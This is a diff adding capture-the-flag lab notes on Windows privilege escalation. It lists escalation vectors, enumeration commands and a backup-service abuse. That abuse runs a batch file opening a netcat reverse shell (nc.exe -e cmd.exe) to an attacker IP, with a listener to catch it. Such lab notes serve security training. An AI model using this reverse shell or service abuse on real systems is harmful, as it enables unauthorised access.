@@ -304,3 +304,48 @@ McSkidy is back, yeah!
    ```
 
 # Task 18 - Day 13 - Networking / They lost the plan
+* Windows Privileges
+   * Domain Admins
+   * Services
+   * Domain Users
+   * Local Accounts
+* Windows Privilege Escalation Vectors
+   * Stored creds
+   * Kernel exploits
+   * Insecure File/Folder permissions
+   * Insecure permissions
+   * DLL Hijacking
+   * Unquoted service paths
+   * Always install elevated
+   * Other software
+* Challenge
+   * Connect to the target with an existing account
+      ```
+      xfreerdp /u:mcskidy /p:password /v:10.10.225.43
+      ```
+   * List users
+      ```
+      net users
+      ```
+   * Get current OS version
+      ```
+      systeminfo | findstr "OS Name"
+      ```
+   * Search services for anything related to backup software
+      ```
+      sc query | findstr NAME | findstr /i back
+      ```
+   * Grab details of the service you found
+      ```
+      wmic service list config | findstr /i ip
+      ```
+   * Launch the software and create a backup job and run it as a service, point it to a malicious bat file you created
+      ```
+      @echo off
+
+      C:\Users\McSkidy\Downloads\nc.exe 10.12.34.56 1337 -e cmd.exe      
+      ```
+   * Start a listener on the attacking machine to catch the shell
+      ```
+      nc -nvlp 1337
+      ```
